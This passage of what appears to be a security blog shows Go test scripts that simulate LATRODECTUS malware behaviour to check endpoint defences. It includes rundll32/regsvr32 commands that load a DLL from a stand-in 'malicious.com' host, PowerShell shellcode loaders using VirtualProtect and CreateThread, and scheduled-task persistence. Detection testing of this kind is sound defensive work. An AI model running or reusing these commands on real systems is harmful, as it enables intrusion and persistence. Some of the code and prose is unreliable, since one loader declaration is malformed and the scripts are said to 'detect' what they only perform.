</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// simulating process execution
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;shell32.dll,Control_RunDLL&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList &#39;/s /u shell32.dll&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// DLL loading from suspicious unbacked memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllLoadingCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> dllLoadingCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// exclusion conditions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exclusionCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;--enable-speech-input --enable-media-stream --no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList &#39;--no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> exclusionCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects network-based behaviours of the malware, like unusual memory execution patterns. it can be thought of as an extension of the previous script.</p>
<h3 id="shellcode-execution-from-low-reputation-module">shellcode execution from low reputation module</h3>
<p><code>LATRODECTUS</code> can execute shellcode from modules that have low or unknown reputations.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">//PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;process execution blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// loading dll with low/unknown rep
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\lowrep.dll&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command New-Item -Path %s -ItemType File&#34;</span>, dllPath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// process execution [loading DLL + executing shellcode]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Add-Type -TypeDefinition @\&#34;using System;using System.Runtime.InteropServices;public class Win32{[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);public delegate IntPtr GetShellcode();[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern IntPtr CreateThread(IntPtr, lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);public static void Main(){IntPtr hModule = LoadLibrary(\\\&#34;%s\\\&#34;);IntPtr procAddr = GetProcAddress(hModule, \\\&#34;GetShellcode\\\&#34;);GetShellcode shellcode = (GetShellcode)Marshal.GetDelegateForFunctionPointer(procAddr, typeof(GetShellcode));IntPtr addr = shellcode();uint oldProtect;VirtualProtect(addr, (UIntPtr)0x1000, 0x40, out oldProtect);CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out _);}}\&#34;@;[Win32]::Main()}&#34;</span>, dllPath, dllPath, dllPath),
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// exclusions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exclusionCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;--no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> exclusionCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove created low reputation DLL file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\lowrep.dll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects shellcode execution that hides behind seemingly benign or low-profile components.</p>
<h3 id="virtualprotect-api-call-from-an-unsigned-dll"><code>VirtualProtect</code> API call from an unsigned DLL</h3>
<p><code>LATRODECTUS</code> uses unsigned DLLs to call <code>VirtualProtect</code>, used to change memory permissions in order to execute code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// loading of an unsigned or untrusted DLL by a trusted binary
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\unsigned.dll&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command New-Item -Path %s -ItemType File&#34;</span>, dllPath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// process execution that involves loading the DLL and calling VirtualProtect API
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command Add-Type -TypeDefinition @\&#34;using System;using System.Runtime.InteropServices;public class Win32{[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);public delegate IntPtr GetShellcode();[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);public static void Main(){IntPtr hModule = LoadLibrary(\\\&#34;%s\\\&#34;);IntPtr procAddr = GetProcAddress(hModule, \\\&#34;GetShellcode\\\&#34;);GetShellcode shellcode = (GetShellcode)Marshal.GetDelegateForFunctionPointer(procAddr, typeof(GetShellcode));IntPtr addr = shellcode();uint oldProtect;VirtualProtect(addr, (UIntPtr)0x1000, 0x40, out oldProtect);CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out _);}}\&#34;@;[Win32]::Main()&#34;</span>, dllPath, dllPath, dllPath),
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// exclusion conditions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exclusionCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;--no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> exclusionCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove created unsigned DLL file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\unsigned.dll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects the execution of unsigned DLLs that attemp to modify memory protections. this is a red-flag for many memory-based attacks.</p>
<h3 id="scheduled-task-creation-by-an-unusual-process">scheduled task creation by an unusual process</h3>
<p><code>LATRODECTUS</code> uses unusual processes, like script interpreters, to create scheduled tasks for persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// commands that simulate scheduled task creation by various processes
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task /tr calc.exe /sc daily /f&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	initialAccessProcesses <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;wscript.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;cscript.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;mshta.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;vbc.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msbuild.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;wmic.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;cmstp.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;RegAsm.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;installutil.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;RegSvcs.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msxsl.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;xwizard.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;csc.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;winword.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;excel.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powerpnt.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, process <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> initialAccessProcesses {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>			<span style="color:#6272a4">// initial access process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			processCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;start /B %s&#34;</span>, process))
</span></span><span style="display:flex;"><span>			err <span style="color:#ff79c6">:=</span> processCmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to start initial access process: %s&#34;</span>, process))
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			}
</span></span><span style="display:flex;"><span>			time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">2</span><span style="color:#ff79c6">*</span>time.Second)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#6272a4">// check if we can execute commands
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;schtasks.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#6272a4">// execute scheduled task creation command
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;successfully executed command: %s with initial access process: %s&#34;</span>, command, process))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;execution blocked&#34;</span>)
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execute unsigned/untrusted executable
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	untrustedCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task_untrusted /tr calc.exe /sc daily /f&#34;</span>)
</span></span><span style="display:flex;"><span>	untrustedCmdOut, untrustedErr <span style="color:#ff79c6">:=</span> untrustedCmd.<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> untrustedErr <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(untrustedCmdOut)))
